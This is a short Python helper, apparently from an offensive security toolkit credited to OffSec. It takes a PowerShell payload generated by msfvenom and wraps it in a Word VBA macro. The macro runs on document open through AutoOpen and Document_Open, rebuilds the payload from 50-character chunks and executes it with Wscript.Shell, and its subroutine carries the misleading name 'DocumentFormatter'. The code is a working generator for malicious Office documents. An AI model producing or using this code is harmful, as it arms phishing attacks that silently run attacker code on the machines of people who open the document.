#!/usr/bin/env python3

def psh_concat(hta):
    """
    Splits PS payload for VBA Macro formatting
    Credit: OffSec

    :param hta: PS payload grepped from msfvenom
    :type hta: str

    :return: Macro-ready payload string to be passed into helpers.doc_generator.doc_gen
    """
    n = 50
    macro = """
Sub AutoOpen()
    DocumentFormatter
End Sub
Sub Document_Open()
    DocumentFormatter
End Sub
Sub DocumentFormatter()
    Dim Str As String

"""
    for i in range(0, len(hta), n):
        if not i:
            macro += ('    Str = "' + hta[i:i+n] + '"\n')
        else:
            macro += ('    Str = Str + "' + hta[i:i+n] + '"\n')

    macro += """
    CreateObject("Wscript.Shell").Run Str
End Sub
"""
    return macro

